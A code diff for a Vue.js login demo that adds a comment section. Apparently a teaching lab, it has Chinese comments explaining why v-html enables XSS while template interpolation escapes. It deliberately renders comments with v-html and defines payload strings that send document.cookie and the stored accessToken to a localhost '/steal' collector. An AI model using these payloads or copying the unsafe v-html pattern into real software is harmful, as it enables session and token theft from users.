@@ -11,6 +11,29 @@
       <button @click="getDashboard">Get Dashboard</button>
       <div>{{ message }}</div>
       <button @click="logout">Logout</button>
+      <div>
+        <h2>Comments</h2>
+        <div v-for="comment in comments" :key="comment.createdAt">
+          <strong>{{ comment.username }}</strong>
+          <div v-html="comment.content"></div>
+          <!-- 基本上需要v-html或者其他以innerHTML为底层的api才能触发xss危险 -->
+        </div>
+        <div v-if="loggedIn">
+          <h3>Add a Comment</h3>
+          <p>
+            <!-- 这里vue的{{}} react的{}底层都使用了textContent,所以不会像innerHTML一样会有安全隐患,会自动转义 -->
+            <span>{{ xssString }}</span>
+          </p>
+          <h3>输入{{ xssFetchCookie }}劫持cookie中的refreshToken</h3>
+          <h3>输入{{ xssFetchLocalStorage }}劫持cookie中的accessToken</h3>
+          <h4>只要再在页面以透明的方式渲染出一条评论,这个token就被窃取了</h4>
+          <textarea
+            v-model="newComment"
+            placeholder="Write your comment here"
+          ></textarea>
+          <button @click="addComment">Submit Comment</button>
+        </div>
+      </div>
     </div>
   </div>
 </template>
@@ -25,6 +48,14 @@ export default {
       password: "",
       message: "",
       loggedIn: false,
+      newComment: "",
+      comments: [],
+      xssString:
+        "<button onClick='console.log(localStorage);'>xssString</button>",
+      xssFetchCookie:
+        '<button onclick="const img = new Image(); img.src = `http://localhost:7000/steal?cookie=${document.cookie}`;">xssFetchCookie</button>',
+      xssFetchLocalStorage:
+        "<button onclick=\"const img = new Image(); img.src = `http://localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`;\">xssFetchLocalStorage</button>",
     };
   },
   methods: {
@@ -41,8 +72,8 @@ export default {
           }
         );
         this.loggedIn = true;
-        console.log(res);
         localStorage.setItem("accessToken", res.data.accessToken);
+        this.getComments(); // 获取评论
       } catch (error) {
         alert("Login failed: " + error.response.data.message);
       }
@@ -100,11 +131,45 @@ export default {
         localStorage.removeItem("accessToken");
       }
     },
+    async getComments() {
+      try {
+        const response = await axios.get("/api/comments"); // 假设postId为1
+        this.comments = response.data.comments;
+      } catch (error) {
+        console.error("Failed to get comments", error);
+      }
+    },
+    async addComment() {
+      try {
+        const response = await axios.post(
+          "/api/comments",
+          {
+            content: this.newComment,
+            postId: new Date().getTime() + Math.random() * 10, // 假设postId为1
+          },
+          {
+            headers: {
+              Authorization: `Bearer ${localStorage.getItem("accessToken")}`,
+            },
+            withCredentials: true,
+          }
+        );
+        this.newComment = "";
+        this.getComments();
+      } catch (error) {
+        console.error("Failed to add comment", error);
+        if (error.response && error.response.status === 401) {
+          this.refreshToken(this.addComment);
+        }
+      }
+    },
   },
   async mounted() {
     const token = localStorage.getItem("accessToken");
-
-    this.loggedIn = true;
+    if (token) {
+      this.loggedIn = true;
+      this.getComments(); // 获取评论
+    }
   },
 };
 </script>
